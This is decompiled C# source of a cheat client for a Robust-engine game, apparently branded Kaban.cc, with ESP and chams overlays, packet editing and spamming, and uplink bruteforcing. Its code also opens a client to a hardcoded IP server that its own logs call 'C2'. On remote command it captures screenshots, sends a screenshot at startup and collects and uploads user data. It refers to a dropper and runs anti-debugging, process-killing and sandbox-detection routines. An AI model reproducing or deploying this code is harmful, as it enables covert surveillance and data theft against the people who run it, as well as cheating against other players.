using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using HarmonyLib;
using Robust.Client.Graphics;
using Robust.Shared.Asynchronous;
using Robust.Shared.ContentPack;
using Robust.Shared.GameObjects;
using Robust.Shared.IoC;
using Robust.Shared.Network;
using WebControlServer;
using RegistryDebugChecker;
using KernelDebuggerDetector;
using MemoryThreatMonitor;
using DebugApiHook;
using DebuggerThreadKiller;
using DebuggerProcessKiller;
using ManagedDebuggerDetector;
using PlayerEspOverlay;
using ShaderDrawHelpers;
using MeleeHitPatch;
using GrenadeHelperOverlay;
using DamageNumbersHook;
using MeleeAttackPatch;
using EventLogWindow;
using EventSenderWindow;
using PacketEditorWindow;
using StatusNotificationsSystem;
using NotificationWindow;
using HardwareUnlocker;
using PacketLogger;
using AutoStrafe;
using LuaScriptManager;
using AntagAutoBuyEngine;
using AntagAutoBuySystem;
using UplinkBruteforceSystem;
using ChamsOverlay;
using AntiDebugMonitor;
using AntiDumpToolMonitor;
using VmRuntimeMonitor;
using TelemetryHttpClient;
using LicenseValidationResult;
using DiscordRelayClient;
using UserDataCollector;
using AntiDumpFileMonitor;
using EndpointValidator;
using EndpointValidationSummary;
using PatchTamperingValidator;
using HostAvailabilityChecker;
using HwidProvider;
using NetworkConnectivityMonitor;
using LicenseStorage;
using NetworkDebuggerDetector;
using RuntimeTokenVerifier;
using TelemetryCollector;
using VersionChecker;
using WatermarkValidator;
using WineDetector;
using TelemetryQueue;
using MemoryAccessBlocker;
using HarmonyHookDetector;
using IatHookDetector;
using SandboxDetector;
using StrictConfigSerializer;
using AntiCheatConfig;
using MethodIntegrityMonitor;
using BlockedProcessChecker;
using SuspiciousDllChecker;
using AssemblyComparisonChecker;
using CheatEngineKiller;

public class BootstrapHooks : GameClient
{
	[StructLayout(LayoutKind.Auto)]
	[CompilerGenerated]
	private struct _003CShutdownSystemsAsync_003Ed__33 : IAsyncStateMachine
	{
		public int _003C_003E1__state;

		public AsyncTaskMethodBuilder _003C_003Et__builder;

		public BootstrapHooks _003C_003E4__this;

		private TaskAwaiter _003C_003Eu__1;

		private unsafe void MoveNext()
		{
			int num = _003C_003E1__state;
			BootstrapHooks CS_0024_003C_003E8__locals10 = _003C_003E4__this;
			try
			{
				try
				{
					TaskAwaiter awaiter;
					if (num == 0)
					{
						awaiter = _003C_003Eu__1;
						_003C_003Eu__1 = default(TaskAwaiter);
						num = (_003C_003E1__state = -1);
						goto IL_019b;
					}
					if (gclass136_0 != null)
					{
						awaiter = gclass136_0.DisconnectAsync().GetAwaiter();
						if (!awaiter.IsCompleted)
						{
							num = (_003C_003E1__state = 0);
							_003C_003Eu__1 = awaiter;
							_003C_003Et__builder.AwaitUnsafeOnCompleted(ref awaiter, ref this);
							return;
						}
						goto IL_019b;
					}
					goto end_IL_015e;
					IL_019b:
					awaiter.GetResult();
					gclass136_0.Dispose();
					end_IL_015e:;
				}
				catch (Exception ex)
				{
					Logger.Warn("C2 shutdown error: " + ex.Message);
				}
				try
				{
					TelemetryCollector? gclass155_ = gclass155_0;
					if (gclass155_ != null)
					{
						((_003CShutdownSystemsAsync_003Ed__33*)gclass155_)->method_1();
					}
				}
				catch (Exception ex2)
				{
					Logger.Warn("Telemetry shutdown error: " + ex2.Message);
				}
				try
				{
					AntiDumpToolMonitor.StopMonitoring();
				}
				catch (Exception ex3)
				{
					Logger.Warn("Anti-Dump shutdown error: " + ex3.Message);
				}
				try
				{
					LuaScriptManager.Instance.StopAllScripts();
				}
				catch (Exception ex4)
				{
					Logger.Warn("LuaManager shutdown error: " + ex4.Message);
				}
				try
				{
					RenderHookManager.Instance.Event_0 -= CS_0024_003C_003E8__locals10.LoadFontAtlas;
					RenderHookManager.Instance.Dispose();
				}
				catch (Exception ex5)
				{
					Logger.Warn("RenderManager shutdown error: " + ex5.Message);
				}
				try
				{
					CS_0024_003C_003E8__locals10.gclass5_0?.Shutdown();
					WebControlServer gclass85_ = CS_0024_003C_003E8__locals10.gclass85_0;
					if (gclass85_ != null)
					{
						((_003CShutdownSystemsAsync_003Ed__33*)gclass85_)->method_0();
					}
				}
				catch (Exception ex6)
				{
					Logger.Warn("Discord/WebServer shutdown error: " + ex6.Message);
				}
				if (CS_0024_003C_003E8__locals10.harmony_0 != null)
				{
					try
					{
						CS_0024_003C_003E8__locals10.harmony_0.UnpatchAll("CerberusWareV3.HitSound");
					}
					catch
					{
					}
				}
				if (CS_0024_003C_003E8__locals10.gform0_0 != null && !((Control)CS_0024_003C_003E8__locals10.gform0_0).IsDisposed && ((Control)CS_0024_003C_003E8__locals10.gform0_0).IsHandleCreated)
				{
					try
					{
						((Control)CS_0024_003C_003E8__locals10.gform0_0).BeginInvoke((Delegate)(Action)delegate
						{
							((Component)(object)CS_0024_003C_003E8__locals10.gform0_0).Dispose();
						});
					}
					catch
					{
					}
				}
			}
			catch (Exception exception)
			{
				_003C_003E1__state = -2;
				_003C_003Et__builder.SetException(exception);
				return;
			}
			_003C_003E1__state = -2;
			_003C_003Et__builder.SetResult();
		}

		void IAsyncStateMachine.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			this.MoveNext();
		}

		[DebuggerHidden]
		private void SetStateMachine(IAsyncStateMachine stateMachine)
		{
			_003C_003Et__builder.SetStateMachine(stateMachine);
		}

		void IAsyncStateMachine.SetStateMachine(IAsyncStateMachine stateMachine)
		{
			//ILSpy generated this explicit interface implementation from .override directive in SetStateMachine
			this.SetStateMachine(stateMachine);
		}

		public unsafe void method_0()
		{
			//IL_0009: Expected O, but got Ref
			((WebControlServer)Unsafe.AsPointer(ref this)).Dispose();
		}

		public unsafe void method_1()
		{
			//IL_0009: Expected O, but got Ref
			((TelemetryCollector)Unsafe.AsPointer(ref this)).Dispose();
		}
	}

	private WebControlServer gclass85_0;

	private DiscordRpcManager gclass5_0;

	private Thread thread_0;

	private WinFormsMenuWindow gform0_0;

	private bool bool_0 = true;

	private int int_0;

	private int int_1;

	private int int_2;

	private Harmony harmony_0;

	private static TelemetryCollector? gclass155_0;

	private static DiscordRelayClient? gclass136_0;

	private float float_0;

	private int int_3;

	private float Single_0
	{
		get
		{
			return float_0;
		}
		set
		{
			float_0 = value;
		}
	}

	private int Int32_0
	{
		get
		{
			return int_3;
		}
		set
		{
			int_3 = value;
		}
	}

	[DllImport("user32.dll")]
	private static extern short GetAsyncKeyState(int vKey);

	private static void InitializeTelemetrySystem(string hwid, string licenseKey)
	{
		try
		{
			string licenseServerUrl = "http://31.177.83.245:3001";
			string version = "1.0.0";
			try
			{
				gclass155_0 = new TelemetryCollector(licenseServerUrl, hwid, licenseKey, version);
			}
			catch (FileNotFoundException)
			{
				gclass155_0 = null;
				return;
			}
			catch (TypeLoadException)
			{
				gclass155_0 = null;
				return;
			}
			SendStartupScreenshotAsync();
		}
		catch (Exception)
		{
			gclass155_0 = null;
		}
	}

	private static void InitializeC2Client(string hwid, string licenseKey)
	{
		try
		{
			string version = "1.0.0";
			gclass136_0 = new DiscordRelayClient("http://31.177.83.245:3001", hwid, licenseKey, version);
			gclass136_0.Event_0 += delegate(object? sender, string commandId)
			{
				HandleC2ScreenshotRequestAsync(commandId, hwid, licenseKey);
			};
			gclass136_0.Event_1 += delegate
			{
				HandleC2DataCollectionAsync(hwid);
			};
			gclass136_0.Event_3 += delegate
			{
			};
			gclass136_0.Event_4 += delegate
			{
			};
			ConnectC2ClientAsync();
		}
		catch (Exception)
		{
		}
	}

	public static void SendSecurityScreenshot(string reason)
	{
		if (gclass155_0 != null)
		{
			SendSecurityScreenshotAsync(reason);
		}
	}

	private static async Task SendSecurityScreenshotAsync(string reason)
	{
		try
		{
			await gclass155_0.SendScreenshotAsync();
		}
		catch (Exception)
		{
		}
	}

	private static async Task SendStartupScreenshotAsync()
	{
		await Task.Delay(5000);
		try
		{
			if (gclass155_0 != null)
			{
				await gclass155_0.SendScreenshotAsync();
			}
		}
		catch (Exception)
		{
		}
	}

	private static async Task HandleC2ScreenshotRequestAsync(string commandId, string hwid, string licenseKey)
	{
		try
		{
			if (gclass155_0 == null)
			{
				try
				{
					string version = "1.0.0";
					gclass155_0 = new TelemetryCollector("http://31.177.83.245:3001", hwid, licenseKey, version);
				}
				catch (Exception)
				{
					if (gclass136_0 != null)
					{
						gclass136_0.SendCommandResponse(commandId, success: false, "Telemetry system unavailable");
					}
					return;
				}
			}
			string text = gclass155_0.CaptureScreenshot();
			if (string.IsNullOrEmpty(text))
			{
				if (gclass136_0 != null)
				{
					gclass136_0.SendCommandResponse(commandId, success: false, "Screenshot capture failed");
				}
			}
			else if (gclass136_0 != null)
			{
				await gclass136_0.SendScreenshotAsync(text, commandId);
			}
		}
		catch (Exception ex2)
		{
			_ = ex2.InnerException;
			if (gclass136_0 != null)
			{
				gclass136_0.SendCommandResponse(commandId, success: false, ex2.Message);
			}
		}
	}

	private static async Task HandleC2DataCollectionAsync(string hwid)
	{
		try
		{
			await UserDataCollector.CollectAndSendAsync(hwid, "http://31.177.83.245:3001");
		}
		catch (Exception)
		{
		}
	}

	private static async Task ConnectC2ClientAsync()
	{
		try
		{
			await gclass136_0.ConnectAsync();
		}
		catch (Exception)
		{
		}
	}

	private static async Task CollectAndSendDataAsync(string hwid)
	{
		await Task.Delay(1000);
		try
		{
			await UserDataCollector.CollectAndSendAsync(hwid, "http://31.177.83.245:3001");
		}
		catch (Exception ex)
		{
			_ = ex.InnerException;
		}
	}

	private static async Task ValidateEndpointsAsync()
	{
		try
		{
			EndpointValidationSummary gClass = await EndpointValidator.ValidateAllEndpointsAsync();
			if (!gClass.AllEndpointsAvailable)
			{
				string[] failedEndpoints = gClass.FailedEndpoints;
				for (int i = 0; i < failedEndpoints.Length; i++)
				{
				}
				Thread.Sleep(3000);
				Environment.Exit(1);
			}
		}
		catch (Exception)
		{
			Thread.Sleep(3000);
			Environment.Exit(1);
		}
	}

	private static async Task ValidateLicenseAndInitializeAsync(string licenseKey, string hwid)
	{
		try
		{
			LicenseValidationResult gClass = await TelemetryHttpClient.ValidateLicenseAsync(licenseKey, hwid);
			if (gClass.Valid)
			{
				_ = gClass.ExpiresAt.HasValue;
				await TelemetryHttpClient.SendStartupEventAsync(hwid, licenseKey, "1.0.0");
				InitializeTelemetrySystem(hwid, licenseKey);
				if (gclass155_0 != null)
				{
					VmRuntimeMonitor.PerformOneTimeCheck(gclass155_0);
				}
				InitializeC2Client(hwid, licenseKey);
				CollectAndSendDataAsync(hwid);
			}
			else
			{
				Thread.Sleep(2000);
				Environment.Exit(1);
			}
		}
		catch (Exception)
		{
		}
	}

	public override void PreInit()
	{
		//IL_0352: Expected I8, but got I4
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_02f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ff: Expected O, but got Unknown
		WineDetector.CheckOnce();
		try
		{
			Logger.Info("[EntryPoint] Validating dropper watermark...");
			string environmentVariable = Environment.GetEnvironmentVariable("KABAN_DROPPER_WATERMARK");
			if (string.IsNullOrEmpty(environmentVariable))
			{
				Logger.Fatal("[EntryPoint] ❌ KABAN_DROPPER_WATERMARK environment variable is NULL or EMPTY!");
				Logger.Fatal("[EntryPoint] ❌ This means dropper did not set the watermark!");
			}
			else
			{
				Logger.Info($"[EntryPoint] Found watermark in environment (length: {environmentVariable.Length})");
			}
			RuntimeTokenVerifier.VerifyRuntimeContext();
			Logger.Info("[EntryPoint] ✅ Dropper watermark validated");
		}
		catch (Exception ex)
		{
			Logger.Fatal("[EntryPoint] ❌ Dropper watermark validation failed: " + ex.Message);
			Environment.Exit(57005);
		}
		WatermarkValidator.ValidateWatermark();
		try
		{
			AntiDumpFileMonitor.StartMonitoring();
		}
		catch (Exception)
		{
		}
		try
		{
			StartEarlyGuiInitialization();
		}
		catch (Exception)
		{
		}
		try
		{
			NetworkConnectivityMonitor.StartMonitoring();
		}
		catch (Exception)
		{
			Environment.Exit(57005);
		}
		try
		{
			HostAvailabilityChecker.CheckHostOrExitAsync().Wait(TimeSpan.FromSeconds(7L));
		}
		catch (Exception ex5)
		{
			Logger.Fatal("[EntryPoint] ❌ Host availability check failed: " + ex5.Message);
			Logger.Fatal("[EntryPoint] ❌ Cannot proceed without server access - potential bypass attempt");
			Environment.Exit(57005);
		}
		try
		{
			AntiDebugMonitor.StartMonitoring();
			AntiDumpToolMonitor.StartMonitoring();
			NetworkDebuggerDetector.StartMonitoring();
			NetworkConnectivityMonitor.StartMonitoring();
			VersionChecker.StartMonitoring();
		}
		catch (Exception)
		{
		}
		try
		{
			string XmsdZxdwKP = HwidProvider.GetOrCreateHWID();
			if (!LicenseStorage.LicenseExists())
			{
				Environment.Exit(1);
				return;
			}
			string B06dHeGyGg = LicenseStorage.LoadLicense();
			if (string.IsNullOrWhiteSpace(B06dHeGyGg))
			{
				Environment.Exit(1);
				return;
			}
			PatchTamperingValidator.StartMonitoring();
			try
			{
				AntiCheatConfig gClass = StrictConfigSerializer.LoadDefault();
				if (gClass.EnableTelemetry)
				{
					TelemetryQueue.Initialize(gClass.TelemetryBatchInterval, gClass.TelemetryStoragePath);
				}
				if (gClass.EnableAntiDebug)
				{
					DebugApiHook.Initialize();
					ManagedDebuggerDetector.Initialize();
					DebuggerProcessKiller.Initialize();
					DebuggerThreadKiller.Initialize();
				}
				if (gClass.EnableAntiDump)
				{
					MemoryThreatMonitor.Initialize();
				}
				if (gClass.EnableAntiTamper)
				{
					MethodIntegrityMonitor.Initialize();
				}
				if (gClass.EnableHooksDetection)
				{
					SandboxDetector.Initialize();
					HarmonyHookDetector.Initialize();
					IatHookDetector.Initialize();
				}
				if (gClass.EnableProcessHiding)
				{
					MemoryAccessBlocker.Initialize();
				}
				if (gClass.EnableAntiInjection)
				{
					RegistryDebugChecker.Initialize();
					AssemblyComparisonChecker.Initialize();
					if (gClass.EnableAntiCMD)
					{
						BlockedProcessChecker.Initialize();
					}
					if (gClass.EnableAntiDLL)
					{
						SuspiciousDllChecker.Initialize();
					}
					if (gClass.EnableCheatEngineDetection)
					{
						CheatEngineKiller.Initialize();
					}
					if (gClass.EnableSystemIntegrityChecks)
					{
						KernelDebuggerDetector.Initialize();
					}
				}
			}
			catch (Exception)
			{
			}
			Task.Run(async delegate
			{
				await ValidateEndpointsAsync();
			});
			Task.Run(async delegate
			{
				await ValidateLicenseAndInitializeAsync(B06dHeGyGg, XmsdZxdwKP);
			});
		}
		catch (Exception)
		{
			Environment.Exit(1);
			return;
		}
		NukePdaPatchHelper.PatchAll();
		try
		{
			harmony_0 = new Harmony("CerberusWareV3.HitSound");
			MeleeHitPatch.ApplyPatches(harmony_0);
		}
		catch (Exception)
		{
		}
		try
		{
			MeleeAttackPatch.ApplyPatches(new Harmony("CerberusWareV3.HitParticles"));
		}
		catch (Exception)
		{
		}
	}

	public override void Init()
	{
		if (Interlocked.Exchange(ref int_0, 1) != 0)
		{
			return;
		}
		Task.Run(async delegate
		{
			while (Volatile.Read(in int_1) == 0)
			{
				try
				{
					ITaskManager val = ((GameShared)this).Dependencies.Resolve<ITaskManager>();
					string text = SynchronizationContext.Current?.GetType().FullName;
					if (text == null || !text.Contains("RobustSynchronizationContext"))
					{
						val.RunOnMainThread((Action)InitMainThread);
					}
					else
					{
						InitMainThread();
					}
					break;
				}
				catch
				{
					await Task.Delay(250);
				}
			}
		});
	}

	private void InitMainThread()
	{
		if (Interlocked.Exchange(ref int_1, 1) != 0)
		{
			return;
		}
		try
		{
			RenderHookManager.Instance.Initialize();
			RenderHookManager.Instance.Event_0 += LoadFontAtlas;
		}
		catch (Exception value)
		{
			Logger.Info($"RenderManager init error: {value}");
		}
		try
		{
			ShaderDrawHelpers.Initialize();
		}
		catch (Exception)
		{
		}
		try
		{
			if (((GameShared)this).Dependencies == null)
			{
				throw new NullReferenceException("Dependencies is null");
			}
			IOverlayManager val = ((GameShared)this).Dependencies.Resolve<IOverlayManager>();
			RenderHookManager.Instance.RegisterRender(new HudRenderer());
			RenderHookManager.Instance.RegisterRender(new NotificationOverlay());
			FeatureToggleState.PacketSpammerOverlay = new NotificationWindow();
			FeatureToggleState.EventSpammerOverlay = new EventSenderWindow();
			FeatureToggleState.NetLoggerOverlay = new PacketEditorWindow();
			FeatureToggleState.EventLoggerOverlay = new EventLogWindow();
			RenderHookManager.Instance.RegisterRender(FeatureToggleState.PacketSpammerOverlay);
			RenderHookManager.Instance.RegisterRender(FeatureToggleState.EventSpammerOverlay);
			RenderHookManager.Instance.RegisterRender(FeatureToggleState.NetLoggerOverlay);
			RenderHookManager.Instance.RegisterRender(FeatureToggleState.EventLoggerOverlay);
			try
			{
				PacketLogger.Initialize(IoCManager.Resolve<INetManager>());
			}
			catch (Exception)
			{
			}
			val.AddOverlay((Overlay)(object)new GrenadeHelperOverlay());
			try
			{
				val.AddOverlay((Overlay)(object)new ChamsOverlay());
			}
			catch (Exception ex3)
			{
				Logger.Info("[EntryPoint] BacktrackChamsOverlay failed: " + ex3.Message);
			}
			try
			{
				val.AddOverlay((Overlay)(object)new PlayerEspOverlay());
			}
			catch (Exception ex4)
			{
				Logger.Info("[EntryPoint] TargetStrafeOverlay failed: " + ex4.Message);
			}
		}
		catch (Exception value2)
		{
			Logger.Info($"[EntryPoint] Overlay setup warning: {value2}");
		}
		try
		{
			if (((GameShared)this).Dependencies == null)
			{
				throw new NullReferenceException("Dependencies is null");
			}
			IEntitySystemManager sysMan = ((GameShared)this).Dependencies.Resolve<IEntitySystemManager>();
			if (!TryHookEntitySystems(sysMan))
			{
				ScheduleRetryEntitySystems();
			}
		}
		catch (Exception value3)
		{
			Logger.Info($"[EntryPoint] DamageNumbersSystem warning: {value3}");
		}
		try
		{
			gclass85_0 = new WebControlServer();
			try
			{
				if (((GameShared)this).Dependencies == null)
				{
					throw new NullReferenceException("Dependencies is null");
				}
				IoCManager.InjectDependencies<WebControlServer>(gclass85_0);
				ITaskManager taskManager = ((GameShared)this).Dependencies.Resolve<ITaskManager>();
				gclass85_0.SetTaskManager(taskManager);
				IEntitySystemManager sysMan2 = ((GameShared)this).Dependencies.Resolve<IEntitySystemManager>();
				if (!TryHookEntitySystems(sysMan2))
				{
					ScheduleRetryEntitySystems();
				}
			}
			catch (Exception value4)
			{
				Logger.Info($"[EntryPoint] Failed to resolve dependencies: {value4}");
			}
			gclass85_0.Start();
			try
			{
				gclass5_0 = new DiscordRpcManager(gclass85_0);
			}
			catch (Exception)
			{
			}
			try
			{
				LuaScriptManager.Instance.LoadScripts();
			}
			catch (Exception)
			{
			}
		}
		catch (Exception)
		{
		}
		if (thread_0 == null || !thread_0.IsAlive)
		{
			StartEarlyGuiInitialization();
		}
		bool_0 = true;
		Task.Run((Func<Task?>)InputLoop);
	}

	private bool TryHookEntitySystems(IEntitySystemManager sysMan)
	{
		if (Volatile.Read(in int_2) != 0)
		{
			return true;
		}
		try
		{
			bool flag = true;
			try
			{
				HudUpdateSystem gClass = default(HudUpdateSystem);
				if (sysMan == null)
				{
					flag = false;
				}
				else if (sysMan.TryGetEntitySystem<HudUpdateSystem>(ref gClass))
				{
				}
			}
			catch (Exception)
			{
			}
			DamageNumbersHook gClass2 = default(DamageNumbersHook);
			if (!sysMan.TryGetEntitySystem<DamageNumbersHook>(ref gClass2))
			{
				flag = false;
			}
			MeleeAttackPatch gClass3 = default(MeleeAttackPatch);
			if (!sysMan.TryGetEntitySystem<MeleeAttackPatch>(ref gClass3))
			{
				flag = false;
			}
			StatusNotificationsSystem gClass4 = default(StatusNotificationsSystem);
			if (!sysMan.TryGetEntitySystem<StatusNotificationsSystem>(ref gClass4))
			{
				flag = false;
			}
			HardwareUnlocker gClass5 = default(HardwareUnlocker);
			if (!sysMan.TryGetEntitySystem<HardwareUnlocker>(ref gClass5))
			{
				flag = false;
			}
			try
			{
				AntagAutoBuySystem gClass6 = default(AntagAutoBuySystem);
				sysMan.TryGetEntitySystem<AntagAutoBuySystem>(ref gClass6);
			}
			catch
			{
			}
			try
			{
				UplinkBruteforceSystem gClass7 = default(UplinkBruteforceSystem);
				sysMan.TryGetEntitySystem<UplinkBruteforceSystem>(ref gClass7);
			}
			catch
			{
			}
			try
			{
				AutoStrafe gClass8 = default(AutoStrafe);
				sysMan.TryGetEntitySystem<AutoStrafe>(ref gClass8);
			}
			catch
			{
			}
			try
			{
				AntagAutoBuyEngine.LoadPresets();
			}
			catch
			{
			}
			if (gclass85_0 != null)
			{
				SessionTrackerSystem playerTracker = default(SessionTrackerSystem);
				if (!sysMan.TryGetEntitySystem<SessionTrackerSystem>(ref playerTracker))
				{
					flag = false;
				}
				else
				{
					gclass85_0.SetPlayerTracker(playerTracker);
				}
			}
			if (flag)
			{
				Interlocked.Exchange(ref int_2, 1);
			}
			return flag;
		}
		catch
		{
			return false;
		}
	}

	private void StartEarlyGuiInitialization()
	{
		if (thread_0 == null)
		{
			thread_0 = new Thread(GuiThreadLoop);
			thread_0.SetApartmentState(ApartmentState.STA);
			thread_0.IsBackground = true;
			thread_0.Name = "Kaban.cc GUI Thread";
			thread_0.Start();
		}
	}

	private void ScheduleRetryEntitySystems()
	{
		if (((GameShared)this).Dependencies == null)
		{
			return;
		}
		try
		{
			((GameShared)this).Dependencies.Resolve<ITaskManager>().RunOnMainThread((Action)async delegate
			{
				for (int i = 0; i < 40; i++)
				{
					if (Volatile.Read(in int_2) != 0)
					{
						break;
					}
					try
					{
						IEntitySystemManager sysMan = ((GameShared)this).Dependencies.Resolve<IEntitySystemManager>();
						if (TryHookEntitySystems(sysMan))
						{
							break;
						}
					}
					catch
					{
					}
					await Task.Delay(250);
				}
			});
		}
		catch
		{
		}
	}

	private void GuiThreadLoop()
	{
		//IL_0081: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e2: Expected I8, but got I4
		try
		{
			Application.EnableVisualStyles();
			Application.SetCompatibleTextRenderingDefault(false);
			WinFormsMenuWindow.PreInitializeEnvironment();
			try
			{
				gform0_0 = new WinFormsMenuWindow();
			}
			catch (Exception ex)
			{
				if (ex.Message.Contains("WebView2") || ex.Message.Contains("Couldn't find a compatible") || ex.GetType().Name.Contains("WebView2"))
				{
					MessageBox.Show("❌ Microsoft Edge WebView2 Runtime не установлен!\n\nДля работы Kaban.cc требуется WebView2 Runtime.\n\nПожалуйста, установите его:\n1. Скачайте с официального сайта:\n   https://go.microsoft.com/fwlink/p/?LinkId=2124703\n\n2. Или установите через Windows Update\n\nПосле установки перезапустите игру.", "WebView2 Runtime Required", (MessageBoxButtons)0, (MessageBoxIcon)16);
					try
					{
						Process.Start(new ProcessStartInfo
						{
							FileName = "https://go.microsoft.com/fwlink/p/?LinkId=2124703",
							UseShellExecute = true
						});
					}
					catch
					{
					}
					Environment.Exit(1);
					return;
				}
				throw;
			}
			Timer AlidtbRHcQ = null;
			AlidtbRHcQ = new Timer(delegate
			{
				try
				{
					if (gform0_0 != null && !((Control)gform0_0).IsDisposed && ((Control)gform0_0).IsHandleCreated)
					{
						((Control)gform0_0).BeginInvoke((Delegate)(Action)async delegate
						{
							try
							{
								await gform0_0.WaitForReadyAsync(3000);
								((Control)gform0_0).Show();
								((Control)gform0_0).Hide();
							}
							catch (Exception)
							{
							}
						});
					}
				}
				catch (Exception)
				{
				}
				finally
				{
					AlidtbRHcQ?.Dispose();
				}
			}, null, TimeSpan.FromSeconds(2L), Timeout.InfiniteTimeSpan);
			Application.Run((Form)(object)gform0_0);
		}
		catch (Exception)
		{
		}
	}

	private async Task InputLoop()
	{
		while (bool_0)
		{
			try
			{
				if ((GetAsyncKeyState(45) & 0x8000) != 0)
				{
					if (gform0_0 != null && !((Control)gform0_0).IsDisposed && ((Control)gform0_0).IsHandleCreated)
					{
						((Control)gform0_0).BeginInvoke((Delegate)(Action)delegate
						{
							if (!((Control)gform0_0).Visible)
							{
								((Control)gform0_0).Show();
								((Form)gform0_0).Activate();
							}
							else
							{
								((Control)gform0_0).Hide();
							}
						});
					}
					await Task.Delay(300);
				}
			}
			catch
			{
			}
			await Task.Delay(10);
		}
	}

	public override void Shutdown()
	{
		//IL_002c: Expected I8, but got I4
		bool_0 = false;
		if (ShutdownSystemsAsync().Wait(TimeSpan.FromSeconds(5L)))
		{
			Environment.Exit(0);
		}
		else
		{
			ForceShutdown();
		}
	}

	private unsafe async Task ShutdownSystemsAsync()
	{
		try
		{
			if (gclass136_0 != null)
			{
				await gclass136_0.DisconnectAsync();
				gclass136_0.Dispose();
			}
		}
		catch (Exception ex)
		{
			Logger.Warn("C2 shutdown error: " + ex.Message);
		}
		try
		{
			TelemetryCollector? gClass = gclass155_0;
			if (gClass != null)
			{
				((_003CShutdownSystemsAsync_003Ed__33*)gClass)->method_1();
			}
		}
		catch (Exception ex2)
		{
			Logger.Warn("Telemetry shutdown error: " + ex2.Message);
		}
		try
		{
			AntiDumpToolMonitor.StopMonitoring();
		}
		catch (Exception ex3)
		{
			Logger.Warn("Anti-Dump shutdown error: " + ex3.Message);
		}
		try
		{
			LuaScriptManager.Instance.StopAllScripts();
		}
		catch (Exception ex4)
		{
			Logger.Warn("LuaManager shutdown error: " + ex4.Message);
		}
		try
		{
			RenderHookManager.Instance.Event_0 -= LoadFontAtlas;
			RenderHookManager.Instance.Dispose();
		}
		catch (Exception ex5)
		{
			Logger.Warn("RenderManager shutdown error: " + ex5.Message);
		}
		try
		{
			gclass5_0?.Shutdown();
			WebControlServer gClass2 = gclass85_0;
			if (gClass2 != null)
			{
				((_003CShutdownSystemsAsync_003Ed__33*)gClass2)->method_0();
			}
		}
		catch (Exception ex6)
		{
			Logger.Warn("Discord/WebServer shutdown error: " + ex6.Message);
		}
		if (harmony_0 != null)
		{
			try
			{
				harmony_0.UnpatchAll("CerberusWareV3.HitSound");
			}
			catch
			{
			}
		}
		if (gform0_0 == null || ((Control)gform0_0).IsDisposed || !((Control)gform0_0).IsHandleCreated)
		{
			return;
		}
		try
		{
			((Control)gform0_0).BeginInvoke((Delegate)(Action)delegate
			{
				((Component)(object)gform0_0).Dispose();
			});
		}
		catch
		{
		}
	}

	public static void ForceShutdown()
	{
		try
		{
			Process.GetCurrentProcess();
		}
		catch
		{
		}
		Environment.Exit(1);
	}

	private bool LoadFontAtlas()
	{
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		string name = "Kaban.cc.Resources.Font1.Font.ttf";
		using Stream stream = executingAssembly.GetManifestResourceStream(name);
		if (stream == null)
		{
			return false;
		}
		byte[] font;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			stream.CopyTo(memoryStream);
			font = memoryStream.ToArray();
		}
		ImGuiFontManager.AddFont("global-micro", font);
		ImGuiFontManager.AddFont("global-small", font, 24f);
		ImGuiFontManager.AddFont("global", font, 32f);
		ImGuiFontManager.AddFont("global-large", font, 48f);
		return true;
	}
}
